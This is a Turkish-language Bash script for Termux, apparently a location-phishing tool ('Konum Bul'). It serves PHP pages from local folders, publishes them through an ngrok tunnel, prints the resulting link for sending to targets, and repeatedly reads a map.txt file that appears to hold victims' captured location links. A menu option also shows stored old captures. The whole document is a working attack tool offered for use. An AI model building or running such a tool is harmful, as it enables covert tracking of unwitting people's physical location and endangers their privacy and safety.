#!/data/data/com.termux/bin/bash
#!/bin/bash
clear

banner(){
	rm -rf data/map.txt
	echo -e '\e[37m
	\tCode: YamanEfkar\033[31;40;1m
	¸.•*´¨`*•.¸¸.•*´¨`*•¸.•*´¨`*•.¸
	░
	░\e[31m[\e[37m01\e[31m]\e[37mKonum Bul 1 \e[37m\033[31;31;1m
	░
	░\e[31m[\e[37m02\e[31m]\e[37mKonum Bul 2 \e[37m\033[31;31;1m
	░
	░\e[31m[\e[37m03\e[31m]\e[37mEski Veriler \e[37m\033[31;31;1m
	░¸.•*´¨`*•.¸¸.•*´¨`*•¸.•*´¨`*•.

	\e[33m[\e[37m\t  Konum Bul   \t\e[33m]

	\e[31m[\e[37m99\e[31m]\e[37mÇıkış\e[31m  [\e[37mExit\e[31m]\e[37m
	\e[31m[\e[37m00\e[31m]\e[37mMenü\e[31m   [\e[37mMenu\e[31m]\e[37m
	'

	read -p $'\e[31m▂\e[32m▃\e[31m▃\e[37m İşlem Numarası : ' islem

}

don(){

	while true;
	do
		
		if [[ -e "map.txt" ]]; then
			sleep 5
			ok=$(grep -a 'https' map.txt | cut -d " " -f2 | tr -d '\r')
			sleep 2
			cat map.txt
			rm -rf map.txt
		fi

	done	



}



banner
if [[ $islem == 01 || $islem == 1 ]]; then
	cd Lib/ &&
	php -S 127.0.0.1:9645 > /dev/null 2>&1 &
	sleep 2
	ngrok http 9645 > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e ""
	echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
	don
elif [[ $islem == 02 || $islem == 2 ]]; then
	cd Lib2/ &&
	php -S 127.0.0.1:8854 > /dev/null 2>&1 &
	sleep 2
	ngrok http 8854 > /dev/null 2>&1 &
	sleep 10
	link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
	echo -e ""
	echo -e '\e[31m[\e[32m-----\e[31m]\e[37mUrl : '$link
	don
elif [[ $islem == 03 ]]; then
	cat old.txt	
elif [[ $islem == 99 ]]; then
	exit
elif [[ $islem == 00 ]]; then
	cd ../ && bash tst.sh	
else
	clear
	echo -e "\e[31mLütfen işlem numaranızı kontrol ediniz..."				
	sleep 2
	bash tst.sh

fi

